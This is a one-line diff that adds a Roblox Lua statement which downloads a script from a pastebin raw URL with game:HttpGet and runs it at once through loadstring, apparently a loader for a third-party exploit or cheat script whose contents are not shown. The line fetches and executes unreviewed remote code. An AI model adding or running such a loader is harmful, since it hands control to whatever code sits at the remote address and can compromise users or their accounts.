@@ -1,0 +1,1 @@
+local ez = loadstring(game:HttpGet('https://pastebin.com/raw/tzyKqU3j'))()
